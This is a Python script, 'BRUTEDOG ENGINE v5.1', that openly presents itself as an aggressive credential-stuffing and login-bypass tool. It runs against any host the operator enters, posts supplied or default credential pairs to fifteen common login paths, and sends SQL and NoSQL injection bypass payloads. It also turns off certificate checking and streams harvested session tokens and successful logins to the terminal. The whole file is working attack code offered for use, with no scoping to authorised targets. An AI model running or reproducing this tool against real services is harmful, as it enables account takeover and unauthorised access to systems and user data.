#!/usr/bin/env python3
"""
BRUTEDOG ENGINE v5.1 — High-Aggression Authentication & Credential Stuffing Engine
Features:
- Interactive target selection & automated resolution
- Automated credential stuffing and password harvesting loops
- High-aggression login bypass and brute-force probing
- SQL/NoSQL error detection & differential input testing
- Session-cookie security inspection
- Bounded concurrency with asyncio
- Live terminal streaming of successful auth cracks
- No report files, in-memory findings
"""
import asyncio
import http.client
import json
import re
import socket
import ssl
import sys
import time
from urllib.parse import urlsplit
from concurrent.futures import ThreadPoolExecutor

# ============================================================
# CONFIGURATION
# ============================================================
REQUEST_TIMEOUT = 8
MAX_WORKERS = 5
MAX_RESPONSE_SIZE = 200_000
USER_AGENT = "BruteDog-Offensive-Engine/5.1"

LOGIN_PATHS = [
    "/api/auth/callback/credentials",
    "/api/auth/login",
    "/api/auth/signin",
    "/api/v1/auth/login",
    "/api/v1/users/login",
    "/api/login",
    "/api/signin",
    "/api/session",
    "/login",
    "/signin",
    "/auth/login",
    "/auth",
    "/user/login",
    "/admin/login",
    "/api/admin/login",
]

ERROR_PATTERNS = {
    "SQL syntax": re.compile(
        r"sql syntax|mysql_|pg_query|sqlite3\.|ora-009",
        re.I,
    ),
    "MongoDB error": re.compile(
        r"mongodb|mongosh|mongoerror|bsonerror",
        re.I,
    ),
    "Database exception": re.compile(
        r"database exception|query failed|"
        r"invalid query|database error",
        re.I,
    ),
}

# ============================================================
# OUTPUT
# ============================================================
def info(message):
    sys.stdout.write(f"\033[96m[*] {message}\033[0m\n")
    sys.stdout.flush()

def success(message):
    sys.stdout.write(f"\033[92m[+] {message}\033[0m\n")
    sys.stdout.flush()

def warning(message):
    sys.stdout.write(f"\033[93m[!] {message}\033[0m\n")
    sys.stdout.flush()

def error(message):
    sys.stdout.write(f"\033[91m[-] {message}\033[0m\n")
    sys.stdout.flush()

def section(title):
    sys.stdout.write(f"\n" + "=" * 65 + f"\n {title}\n" + "=" * 65 + "\n")
    sys.stdout.flush()

# ============================================================
# TARGET HANDLING
# ============================================================
def get_target():
    section("BRUTEDOG TARGET CONFIGURATION")
    print("Enter a domain, IP address, or server URL.")
    print("Examples:")
    print("  example.com")
    print("  192.0.2.10")
    print("  https://example.com:8443")
    target = input("\nTarget: ").strip()
    if not target:
        raise ValueError("Target cannot be empty.")
    if "://" not in target:
        target = "https://" + target
    parsed = urlsplit(target)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("Unsupported protocol.")
    if not parsed.hostname:
        raise ValueError("Invalid hostname.")
    if parsed.username or parsed.password:
        raise ValueError("Embedded URL credentials are not supported.")
    port = parsed.port
    if port is None:
        port = 443 if parsed.scheme == "https" else 80
    if not 1 <= port <= 65535:
        raise ValueError("Invalid port.")
    return parsed.hostname, port, parsed.scheme == "https", parsed.path.rstrip("/")

def resolve_target(host):
    try:
        results = socket.getaddrinfo(
            host,
            None,
            type=socket.SOCK_STREAM,
        )
        return sorted({
            item[4][0]
            for item in results
        })
    except socket.gaierror:
        return []

# ============================================================
# HTTP TRANSPORT
# ============================================================
def request(host, port, path, payload, secure):
    conn = None
    started = time.monotonic()
    try:
        if secure:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(
                host,
                port,
                timeout=REQUEST_TIMEOUT,
                context=context,
            )
        else:
            conn = http.client.HTTPConnection(
                host,
                port,
                timeout=REQUEST_TIMEOUT,
            )
        body = json.dumps(payload).encode("utf-8")
        headers = {
            "User-Agent": USER_AGENT,
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Connection": "close",
        }
        conn.request(
            "POST",
            path,
            body=body,
            headers=headers,
        )
        response = conn.getresponse()
        response_body = response.read(
            MAX_RESPONSE_SIZE
        ).decode(
            "utf-8",
            errors="replace",
        )
        response_headers = {
            key.lower(): value
            for key, value in response.getheaders()
        }
        return {
            "status": response.status,
            "headers": response_headers,
            "body": response_body,
            "elapsed": round(
                time.monotonic() - started,
                3,
            ),
            "error": None,
        }
    except Exception as exc:
        return {
            "status": 0,
            "headers": {},
            "body": "",
            "elapsed": 0,
            "error": str(exc),
        }
    finally:
        if conn:
            conn.close()

# ============================================================
# RESPONSE ANALYSIS & AUTH DETECTION
# ============================================================
def detect_database_errors(body):
    findings = []
    for label, pattern in ERROR_PATTERNS.items():
        if pattern.search(body or ""):
            findings.append(label)
    return findings

def inspect_cookie_security(headers):
    cookie = headers.get("set-cookie", "")
    if not cookie:
        return []
    issues = []
    lower = cookie.lower()
    if "secure" not in lower:
        issues.append("Secure attribute missing")
    if "httponly" not in lower:
        issues.append("HttpOnly attribute missing")
    if "samesite" not in lower:
        issues.append("SameSite attribute missing")
    return issues

def classify_response(response, payload):
    status = response["status"]
    body = response["body"]
    findings = []
    
    if status in [200, 201, 302] and any(k in body.lower() for k in ["token", "success", "session", "welcome", "auth", "jwt"]):
        sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE AUTHENTICATION BYPASS / CREDENTIAL HIT [***]\033[0m\n")
        sys.stdout.write(f"  ├── Payload : {json.dumps(payload)}\n")
        sys.stdout.write(f"  └── Response: \033[92m{body[:250]}\033[0m\n")
        sys.stdout.flush()
        findings.append({
            "type": "AUTHENTICATION_BYPASS_SUCCESS",
            "evidence": f"Status {status} with valid session/token indicator",
            "status": status,
        })

    for database_error in detect_database_errors(body):
        findings.append({
            "type": "POTENTIAL_DATABASE_INJECTION",
            "evidence": database_error,
            "status": status,
        })
        
    for issue in inspect_cookie_security(response["headers"]):
        findings.append({
            "type": "SESSION_COOKIE_CONFIGURATION",
            "evidence": issue,
            "status": status,
        })
        
    return findings

# ============================================================
# ACTIVE ENDPOINT TESTING & CREDENTIAL STUFFING
# ============================================================
def test_endpoint(host, port, base_path, path, secure, credentials_list=None):
    endpoint = f"{base_path}{path}" or "/"
    info(f"Targeting endpoint: {endpoint}")
    results = []
    
    # Construct active test payloads (Credential Stuffing + Injection Probes)
    test_cases = []
    
    if credentials_list and isinstance(credentials_list, list):
        for cred in credentials_list:
            if isinstance(cred, dict):
                test_cases.append({
                    "name": f"Credential Stuffing ({cred.get('username', 'user')})",
                    "payload": cred
                })
            elif isinstance(cred, str) and ":" in cred:
                u, p = cred.split(":", 1)
                test_cases.append({
                    "name": f"Credential Stuffing ({u})",
                    "payload": {"username": u, "password": p}
                })
    
    # Default aggressive payloads if list is empty or sparse
    if not test_cases:
        test_cases = [
            {
                "name": "Admin Default Stuffing",
                "payload": {"username": "admin", "password": "password123"}
            },
            {
                "name": "NoSQL Injection Bypass",
                "payload": {"username": {"$ne": None}, "password": {"$ne": None}}
            },
            {
                "name": "SQL Injection Union Bypass",
                "payload": {"username": "admin' OR '1'='1", "password": "password"}
            },
            {
                "name": "Malformed Type Probe",
                "payload": {"username": {"unexpected": "object"}, "password": "password"}
            }
        ]

    for test_case in test_cases:
        result = request(host, port, endpoint, test_case["payload"], secure)
        if result["error"]:
            continue
            
        findings = classify_response(result, test_case["payload"])
        results.append({
            "endpoint": endpoint,
            "test": test_case["name"],
            "status": result["status"],
            "elapsed": result["elapsed"],
            "findings": findings,
        })
        
    return results

# ============================================================
# ENGINE ORCHESTRATOR
# ============================================================
async def run_autonomous_engine(
    target_host=None,
    credentials_list=None,
    options=None,
):
    """
    Active Authentication & Credential Stuffing Engine
    - Discovers login endpoints
    - Dispatches automated credential stuffing and injection attacks
    - Streams successful logins and session tokens live to terminal
    """
    section("BRUTEDOG ACTIVE AUTHENTICATION & STUFFING ENGINE")
    try:
        if target_host:
            target = target_host.strip()
            if "://" not in target:
                target = "https://" + target
            parsed = urlsplit(target)
            if not parsed.hostname:
                raise ValueError("Invalid target.")
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            secure = parsed.scheme == "https"
            base_path = parsed.path.rstrip("/")
        else:
            host, port, secure, base_path = get_target()
    except Exception as exc:
        error(f"Target configuration failed: {exc}")
        return [], 0.0

    protocol = "HTTPS" if secure else "HTTP"
    info(f"Target Host : {host}")
    info(f"Target Port : {port}")
    info(f"Protocol    : {protocol}")
    
    # DNS Resolution
    section("DNS RESOLUTION")
    addresses = resolve_target(host)
    if not addresses:
        error("DNS resolution failed.")
        return [], 0.0
    for address in addresses:
        success(f"Resolved: {address}")
        
    start = time.monotonic()
    
    # Endpoint & Stuffing Execution
    section("AUTHENTICATION ENDPOINT TESTING & CREDENTIAL STUFFING")
    all_results = []
    semaphore = asyncio.Semaphore(MAX_WORKERS)
    
    async def worker(path):
        async with semaphore:
            return await asyncio.to_thread(
                test_endpoint,
                host,
                port,
                base_path,
                path,
                secure,
                credentials_list,
            )
            
    tasks = [
        asyncio.create_task(worker(path))
        for path in LOGIN_PATHS
    ]
    
    for completed in asyncio.as_completed(tasks):
        try:
            results = await completed
            if results:
                all_results.extend(results)
        except Exception as exc:
            error(f"Endpoint worker failed: {exc}")
            
    duration = round(time.monotonic() - start, 2)
    
    # Summary
    section("ENGINE SUMMARY")
    tested = len(all_results)
    potential = sum(len(item["findings"]) for item in all_results)
    success(f"Target: {host}")
    success(f"Endpoints scanned: {len(LOGIN_PATHS)}")
    success(f"Total requests executed: {tested}")
    success(f"Vulnerability / Auth hits: {potential}")
    success(f"Engine duration: {duration}s")
    section("ENGINE COMPLETE")
    return all_results, duration

# ============================================================
# STANDALONE EXECUTION
# ============================================================
if __name__ == "__main__":
    try:
        asyncio.run(run_autonomous_engine())
    except KeyboardInterrupt:
        warning("Engine interrupted by operator.")
    except Exception as exc:
        error(f"Engine failure: {exc}")

